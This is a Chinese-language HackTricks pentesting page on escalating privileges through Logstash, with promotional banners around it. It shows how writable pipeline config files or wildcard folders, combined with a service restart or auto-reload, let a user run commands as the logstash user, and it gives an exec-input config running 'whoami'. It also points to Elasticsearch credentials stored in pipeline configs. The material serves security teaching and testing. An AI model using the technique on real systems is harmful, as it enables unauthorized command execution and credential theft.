<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)

- **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>


# 基本信息

Logstash用于收集、转换和输出日志。这是通过使用**管道**来实现的，管道包含输入、过滤和输出模块。当入侵了一台运行Logstash服务的机器时，该服务变得有趣起来。

## 管道

管道配置文件**/etc/logstash/pipelines.yml**指定了活动管道的位置：
```bash
# This file is where you define your pipelines. You can define multiple.
# For more information on multiple pipelines, see the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
在这里，您可以找到包含配置的管道的 **.conf** 文件的路径。如果使用了 **Elasticsearch 输出模块**，则 **管道** 很可能包含用于 Elasticsearch 实例的有效凭据。由于 Logstash 需要将数据写入 Elasticsearch，这些凭据通常具有更高的权限。如果使用了通配符，Logstash 尝试运行位于该文件夹中与通配符匹配的所有管道。

## 使用可写管道进行权限提升

在尝试提升自己的权限之前，您应该检查运行 logstash 服务的用户，因为这将是您之后将拥有的用户。默认情况下，logstash 服务以 **logstash** 用户的权限运行。

检查您是否具有以下所需权限之一：

* 您对管道 **.conf** 文件具有 **写权限**，或者
* **/etc/logstash/pipelines.yml** 包含通配符，并且您被允许写入指定的文件夹

此外，必须满足以下要求之一：

* 您能够重新启动 logstash 服务，或者
* **/etc/logstash/logstash.yml** 包含条目 **config.reload.automatic: true**

如果指定了通配符，请尝试创建与该通配符匹配的文件。可以将以下内容写入文件以执行命令：
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
**间隔**参数指定了以秒为单位的时间。在这个例子中，**whoami**命令每120秒执行一次。命令的输出保存在**/tmp/output.log**中。

如果**/etc/logstash/logstash.yml**文件包含了**config.reload.automatic: true**的设置，你只需要等待命令执行，因为Logstash会自动识别新的管道配置文件或现有管道配置的任何更改。否则，触发一次logstash服务的重启。

如果没有使用通配符，你可以将这些更改应用到现有的管道配置中。**确保不要破坏任何东西！**

# 参考资料

* [https://insinuator.net/2021/01/pentesting-the-elk-stack/](https://insinuator.net/2021/01/pentesting-the-elk-stack/)


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取最新版本的PEASS或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)

- **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>
